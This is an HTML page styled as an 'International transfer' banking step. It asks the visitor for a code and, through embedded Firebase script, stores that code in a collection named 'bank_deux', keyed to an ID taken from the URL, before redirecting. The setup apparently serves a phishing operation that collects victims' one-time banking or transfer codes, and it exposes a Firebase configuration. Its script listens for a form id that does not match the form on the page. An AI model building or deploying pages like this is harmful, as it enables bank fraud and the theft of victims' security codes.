<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Олон улсын шилжүүлэг</title>

    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/styles.css">

    <script type="module">
        // Importation de Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

        // Configuration Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBAn0oOcsPWlu82p_FpFyz5Bnq4dTd0R2o",
            authDomain: "virement2-bf790.firebaseapp.com",
            projectId: "virement2-bf790",
            storageBucket: "virement2-bf790.firebasestorage.app",
            messagingSenderId: "965517390511",
            appId: "1:965517390511:web:430715abd2331f0a42da5a"
        };

        // Initialisation Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Récupérer l'ID du document depuis l'URL
        const urlParams = new URLSearchParams(window.location.search);
        const documentId = urlParams.get("id");

        // Gestion du formulaire
        document.addEventListener("DOMContentLoaded", function () {
            document.getElementById("codeForm").addEventListener("submit", async function (event) {
                event.preventDefault(); // Empêche le rechargement de la page

                const code = document.getElementById("code").value;

                if (code && documentId) {
                    try {
                        // Mettre à jour le document avec le code
                        await updateDoc(doc(db, "bank_deux", documentId), {
                            code: code
                        });

                        console.log("Document mis à jour avec le code : ", code);

                        // Rediriger vers la page de confirmation
                        window.location.href = "done.html";

                    } catch (error) {
                        console.error("Erreur Firebase :", error);
                    }
                } else {
                    alert("Veuillez entrer un code !");
                }
            });
        });
    </script>
</head>
<body>
    <header class="mb-5">
        <nav class="navbar navbar-expand-lg bg-body-tertiary">
            <div class="container-fluid">
                <a class="navbar-brand" href="#">
                    <img src="images/ban12.png" alt="Logo" width="30" height="24" class="d-inline-block align-text-top">
                    <span class="text-success">Transfert</span> International
                </a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav">
                        <li class="nav-item"><a class="nav-link active" href="index.html">Home</a></li>
                        <li class="nav-item"><a class="nav-link" href="index.html">Sign-In</a></li>
                    </ul>
                </div>
            </div>
        </nav>
    </header>

    <main>
        <div id="loading-spinner" class="spinner-container">
            <div class="spinner"></div>
            <div class="loading-text mb-4">Loading</div>
            <form class="container" id="userForm">
                <input type="hidden" name="id" value="">
                <div class="mb-3">
                    <input type="text" name="code" id="code" class="form-control text-center" placeholder="Enter code" required>
                </div>
                <div class="text-center">
                    <button class="btn btn-success" type="submit">Validate</button>
                </div>
            </form>
        </div>
    </main>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
